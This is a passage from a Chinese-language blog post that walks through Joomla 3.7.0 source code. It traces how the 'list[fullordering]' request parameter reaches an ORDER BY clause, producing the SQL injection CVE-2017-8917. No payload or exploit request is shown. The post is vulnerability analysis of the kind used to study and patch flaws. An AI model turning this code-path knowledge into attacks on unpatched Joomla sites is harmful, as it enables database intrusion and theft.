<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">	// Display the view</span><br><span class="line">	if ($cachable &amp;&amp; $viewType != &#x27;feed&#x27; &amp;&amp; JFactory::getConfig()-&gt;get(&#x27;caching&#x27;) &gt;= 1)</span><br><span class="line">	&#123;</span><br><span class="line">		$option = $this-&gt;input-&gt;get(&#x27;option&#x27;);</span><br><span class="line"></span><br><span class="line">		if (is_array($urlparams))</span><br><span class="line">		&#123;</span><br><span class="line">			$app = JFactory::getApplication();</span><br><span class="line"></span><br><span class="line">			if (!empty($app-&gt;registeredurlparams))</span><br><span class="line">			&#123;</span><br><span class="line">				$registeredurlparams = $app-&gt;registeredurlparams;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				$registeredurlparams = new stdClass;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			foreach ($urlparams as $key =&gt; $value)</span><br><span class="line">			&#123;</span><br><span class="line">				// Add your safe URL parameters with variable type as value &#123;@see JFilterInput::clean()&#125;.</span><br><span class="line">				$registeredurlparams-&gt;$key = $value;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$app-&gt;registeredurlparams = $registeredurlparams;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			/** @var JCacheControllerView $cache */</span><br><span class="line">			$cache = JFactory::getCache($option, &#x27;view&#x27;);</span><br><span class="line">			$cache-&gt;get($view, &#x27;display&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		catch (JCacheException $exception)</span><br><span class="line">		&#123;</span><br><span class="line">			$view-&gt;display();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$view-&gt;display();</span><br><span class="line">                       调用视图的display函数</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return $this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳转到视图的display函数中<code>CVE-2017-8917_Joomla_3.7.0\administrator\components\com_fields\views\fields\view.html.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	public function display($tpl = null)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);</span><br><span class="line">                此处调用了get函数</span><br><span class="line">		$this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);</span><br><span class="line">		$this-&gt;pagination    = $this-&gt;get(&#x27;Pagination&#x27;);</span><br><span class="line">		$this-&gt;filterForm    = $this-&gt;get(&#x27;FilterForm&#x27;);</span><br><span class="line">		$this-&gt;activeFilters = $this-&gt;get(&#x27;ActiveFilters&#x27;);</span><br><span class="line"></span><br><span class="line">		// Check for errors.</span><br><span class="line">		if (count($errors = $this-&gt;get(&#x27;Errors&#x27;)))</span><br><span class="line">		&#123;</span><br><span class="line">			JError::raiseError(500, implode(&quot;\n&quot;, $errors));</span><br><span class="line"></span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进上一段中的get函数<code>CVE-2017-8917_Joomla_3.7.0\libraries\legacy\view\legacy.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function get($property, $default = null)</span><br><span class="line">&#123;</span><br><span class="line">	// If $model is null we use the default model</span><br><span class="line">	if (is_null($default))</span><br><span class="line">	&#123;</span><br><span class="line">		$model = $this-&gt;_defaultModel;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$model = strtolower($default);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// First check to make sure the model requested exists</span><br><span class="line">	if (isset($this-&gt;_models[$model]))</span><br><span class="line">	&#123;</span><br><span class="line">		// Model exists, let&#x27;s build the method name</span><br><span class="line">		$method = &#x27;get&#x27; . ucfirst($property);</span><br><span class="line">                       $property是我们传进的实参也就是&#x27;State&#x27;,那么拼接起来后的方法名就是getState,然后调用这个方法</span><br><span class="line"></span><br><span class="line">		// Does the method exist?</span><br><span class="line">		if (method_exists($this-&gt;_models[$model], $method))</span><br><span class="line">		&#123;</span><br><span class="line">			// The method exists, let&#x27;s call it and return what we get</span><br><span class="line">			$result = $this-&gt;_models[$model]-&gt;$method();</span><br><span class="line"></span><br><span class="line">			return $result;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Degrade to JObject::get</span><br><span class="line">	$result = parent::get($property, $default);</span><br><span class="line"></span><br><span class="line">	return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来跟踪getState，<code>CVE-2017-8917_Joomla_3.7.0\libraries\legacy\model\legacy.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function getState($property = null, $default = null)</span><br><span class="line">	&#123;</span><br><span class="line">		if (!$this-&gt;__state_set)</span><br><span class="line">		&#123;</span><br><span class="line">			// Protected method to auto-populate the model state.</span><br><span class="line">			$this-&gt;populateState();</span><br><span class="line">                         调用populateState函数</span><br><span class="line">			// Set the model state set flag to true.</span><br><span class="line">			$this-&gt;__state_set = true;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>追踪populateState函数<code>CVE-2017-8917_Joomla_3.7.0\administrator\components\com_fields\models\fields.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected function populateState($ordering = null, $direction = null)</span><br><span class="line">	&#123;</span><br><span class="line">		// List state information.</span><br><span class="line">		parent::populateState(&#x27;a.ordering&#x27;, &#x27;asc&#x27;);</span><br><span class="line">                调用了父类populateState方法</span><br><span class="line"></span><br><span class="line">		$context = $this-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.context&#x27;, &#x27;context&#x27;, &#x27;com_content.article&#x27;, &#x27;CMD&#x27;);</span><br><span class="line">		$this-&gt;setState(&#x27;filter.context&#x27;, $context);</span><br><span class="line"></span><br><span class="line">		// Split context into component and optional section</span><br><span class="line">		$parts = FieldsHelper::extract($context);</span><br><span class="line"></span><br><span class="line">		if ($parts)</span><br><span class="line">		&#123;</span><br><span class="line">			$this-&gt;setState(&#x27;filter.component&#x27;, $parts[0]);</span><br><span class="line">			$this-&gt;setState(&#x27;filter.section&#x27;, $parts[1]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>跟踪到父类<code>CVE-2017-8917_Joomla_3.7.0\libraries\legacy\model\list.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// Receive &amp; set list options</span><br><span class="line">if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.list&#x27;, &#x27;list&#x27;, array(), &#x27;array&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">	foreach ($list as $name =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		// Exclude if blacklisted</span><br><span class="line">		if (!in_array($name, $this-&gt;listBlacklist))</span><br><span class="line">		&#123;</span><br><span class="line">			// Extra validations</span><br><span class="line">			switch ($name)</span><br><span class="line">			&#123;</span><br><span class="line">				case &#x27;fullordering&#x27;:</span><br><span class="line">					$orderingParts = explode(&#x27; &#x27;, $value);</span><br><span class="line"></span><br><span class="line">					if (count($orderingParts) &gt;= 2)</span><br><span class="line">					&#123;</span><br><span class="line">						// Latest part will be considered the direction</span><br><span class="line">						$fullDirection = end($orderingParts);</span><br><span class="line"></span><br><span class="line">						if (in_array(strtoupper($fullDirection), array(&#x27;ASC&#x27;, &#x27;DESC&#x27;, &#x27;&#x27;)))</span><br><span class="line">						&#123;</span><br><span class="line">							$this-&gt;setState(&#x27;list.direction&#x27;, $fullDirection);</span><br><span class="line">						&#125;</span><br></pre></td></tr></table></figure>
<p>取了个list的值进来赋值给了$list<br>$list遍历出来，接着switch 键值</p>
<p>switch完成后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;setState(&#x27;list.&#x27; . $name, $value);</span><br></pre></td></tr></table></figure>
<p>通过这个可以设置list.fullordering<br>设置后，下一步就要考虑如何取出来</p>
<p>在视图文件中的display方法中，利用get(‘State’)来调用了getState方法。紧跟着这个操作的下一行，就有一个get(‘Item’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function display($tpl = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);</span><br><span class="line">        $this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);</span><br></pre></td></tr></table></figure>
<p>跟踪getItems函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function getItems()</span><br><span class="line">&#123;</span><br><span class="line">	// Get a storage key.</span><br><span class="line">	$store = $this-&gt;getStoreId();</span><br><span class="line"></span><br><span class="line">	// Try to load the data from internal storage.</span><br><span class="line">	if (isset($this-&gt;cache[$store]))</span><br><span class="line">	&#123;</span><br><span class="line">		return $this-&gt;cache[$store];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		// Load the list items and add the items to the internal cache.</span><br><span class="line">		$this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState(&#x27;list.limit&#x27;));调用了一个_getListQuery方法</span><br><span class="line">	&#125;</span><br><span class="line">	catch (RuntimeException $e)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;setError($e-&gt;getMessage());</span><br><span class="line"></span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return $this-&gt;cache[$store];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟踪_getListQuery函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected function _getListQuery()</span><br><span class="line">&#123;</span><br><span class="line">	// Capture the last store id used.</span><br><span class="line">	static $lastStoreId;</span><br><span class="line"></span><br><span class="line">	// Compute the current store id.</span><br><span class="line">	$currentStoreId = $this-&gt;getStoreId();</span><br><span class="line"></span><br><span class="line">	// If the last store id is different from the current, refresh the query.</span><br><span class="line">	if ($lastStoreId != $currentStoreId || empty($this-&gt;query))</span><br><span class="line">	&#123;</span><br><span class="line">		$lastStoreId = $currentStoreId;</span><br><span class="line">		$this-&gt;query = $this-&gt;getListQuery();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return $this-&gt;query;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后这里又调用了一个getListQuery方法，这里调用的getListQuery不是此类的getListQuery，而是子类，也就是filedsModel类里的getListQuery了,在该方法的最后<br><code>CVE-2017-8917_Joomla_3.7.0\administrator\components\com_fields\models\fields.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// Add the list ordering clause</span><br><span class="line">	$listOrdering = $this-&gt;getState(&#x27;list.fullordering&#x27;, &#x27;a.ordering&#x27;);</span><br><span class="line">	$orderDirn    = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">	if (empty($listOrdering))</span><br><span class="line">	&#123;</span><br><span class="line">		$listOrdering  = $this-&gt;state-&gt;get(&#x27;list.ordering&#x27;, &#x27;a.ordering&#x27;);</span><br><span class="line">		$orderDirn     = $this-&gt;state-&gt;get(&#x27;list.direction&#x27;, &#x27;DESC&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$query-&gt;order($db-&gt;escape($listOrdering) . &#x27; &#x27; . $db-&gt;escape($orderDirn));		</span><br><span class="line"></span><br><span class="line">	return $query;</span><br></pre></td></tr></table></figure>

<p>这里就调用getState将前面设置的list.fullordering的值给取了出来，然后带入到了order函数中去了，就造成了一个order by的注入</p>
<pre><code>
![](15190501748892.png)
</code></pre>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Oct 19 2016 21:00:00 GMT+0800">2016-10-19</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/PHP/">PHP</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Joomla!%203.7%20(CVE-2017-8917)%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
    </ul>

    <div class="home-paginator">
        <div class="paginator">
    
        <a class="prev btn"
           href="/page/9/"
        >Prev</a>
    

    
        <a class="next btn"
           href="/page/11/"
        >Next</a>
    
</div>

    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2016</span>&nbsp;-&nbsp;
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
        </div>
        <!--
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        -->
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>





<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>




    
<script src="/js/lazyload.js"></script>



<div class="post-scripts pjax">
    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
